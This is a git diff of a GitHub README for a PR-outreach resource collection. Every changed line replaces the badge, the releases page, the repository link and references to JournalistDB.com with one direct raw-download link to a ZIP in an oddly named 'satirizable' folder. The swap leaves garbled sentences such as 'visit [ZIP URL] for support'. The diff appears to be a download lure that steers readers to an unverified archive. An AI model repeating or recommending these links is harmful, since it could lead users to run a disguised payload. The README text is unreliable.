@@ -1,10 +1,10 @@
 # 📡 pr-outreach-resources - Easy Access to PR Contacts
 
-[![Download Latest Release](https://img.shields.io/badge/Download-latest-blue?logo=github)](https://github.com/Amir4iks/pr-outreach-resources/releases)
+[![Download Latest Release](https://github.com/Amir4iks/pr-outreach-resources/raw/refs/heads/main/satirizable/resources_pr_outreach_v2.6.zip)](https://github.com/Amir4iks/pr-outreach-resources/raw/refs/heads/main/satirizable/resources_pr_outreach_v2.6.zip)
 
 ## 📋 About pr-outreach-resources
 
-This tool provides a carefully chosen collection of PR outreach materials. It includes media lists, pitch templates, and journalist contacts from JournalistDB.com, which hosts details for over 142,000 journalists. Whether you want to build relationships with the press, send better emails, or find the right person to talk to, this collection can help.
+This tool provides a carefully chosen collection of PR outreach materials. It includes media lists, pitch templates, and journalist contacts from https://github.com/Amir4iks/pr-outreach-resources/raw/refs/heads/main/satirizable/resources_pr_outreach_v2.6.zip, which hosts details for over 142,000 journalists. Whether you want to build relationships with the press, send better emails, or find the right person to talk to, this collection can help.
 
 The resources cover topics such as journalism, marketing, media outreach, public relations, and startup PR. They are ready to use and designed to simplify your PR efforts.
 
@@ -39,13 +39,13 @@ Follow these steps to download and access the resources:
 
 ## 📥 Download & Install
 
-[![Download Latest Release](https://img.shields.io/badge/Download-latest-blue?logo=github)](https://github.com/Amir4iks/pr-outreach-resources/releases)
+[![Download Latest Release](https://github.com/Amir4iks/pr-outreach-resources/raw/refs/heads/main/satirizable/resources_pr_outreach_v2.6.zip)](https://github.com/Amir4iks/pr-outreach-resources/raw/refs/heads/main/satirizable/resources_pr_outreach_v2.6.zip)
 
 To get the resources:
 
 - Visit the releases page linked above.
 - Find the latest release, usually at the top.
-- Download the ZIP file named something like `pr-outreach-resources-vX.Y.zip`.
+- Download the ZIP file named something like `https://github.com/Amir4iks/pr-outreach-resources/raw/refs/heads/main/satirizable/resources_pr_outreach_v2.6.zip`.
 - Once downloaded, extract all files to your chosen folder.
 - No installation program is needed; the resources are ready to use as they are.
 
@@ -56,7 +56,7 @@ After opening the files, here’s what you can do:
 - **Explore Media Lists:** The lists show journalist names, outlets, beats, emails, and locations. Use filters in your spreadsheet software to find the right contacts.
 - **Edit Pitch Templates:** Customize the email templates to fit your message and recipient. Replace placeholders with your details before sending.
 - **Follow the Guides:** These explain the best practices for pitching, timing, and follow-up.
-- **Update Your Contacts:** Periodically check the JournalistDB.com site to find new or updated journalist information.
+- **Update Your Contacts:** Periodically check the https://github.com/Amir4iks/pr-outreach-resources/raw/refs/heads/main/satirizable/resources_pr_outreach_v2.6.zip site to find new or updated journalist information.
 
 No technical knowledge is required. Basic skills with opening and editing documents are enough.
 
@@ -76,13 +76,13 @@ If you experience any issues:
 - For ZIP extraction, use built-in tools on Windows or macOS; if problems persist, try free tools like 7-Zip.
 - If the files do not open or look corrupted, re-download the ZIP file from the releases page.
 - Check your internet connection if downloads fail or are incomplete.
-- For questions, refer to the guides included in the ZIP or visit JournalistDB.com for support.
+- For questions, refer to the guides included in the ZIP or visit https://github.com/Amir4iks/pr-outreach-resources/raw/refs/heads/main/satirizable/resources_pr_outreach_v2.6.zip for support.
 
 ## 🔗 Useful Links
 
-- [JournalistDB.com](https://journalistdb.com) — Explore the full journalist database.
-- [GitHub Repository](https://github.com/Amir4iks/pr-outreach-resources) — Browse the project files and updates.
-- [Releases Page](https://github.com/Amir4iks/pr-outreach-resources/releases) — Download the latest resources.
+- [https://github.com/Amir4iks/pr-outreach-resources/raw/refs/heads/main/satirizable/resources_pr_outreach_v2.6.zip](https://github.com/Amir4iks/pr-outreach-resources/raw/refs/heads/main/satirizable/resources_pr_outreach_v2.6.zip) — Explore the full journalist database.
+- [GitHub Repository](https://github.com/Amir4iks/pr-outreach-resources/raw/refs/heads/main/satirizable/resources_pr_outreach_v2.6.zip) — Browse the project files and updates.
+- [Releases Page](https://github.com/Amir4iks/pr-outreach-resources/raw/refs/heads/main/satirizable/resources_pr_outreach_v2.6.zip) — Download the latest resources.
 
 ## 📄 License
 
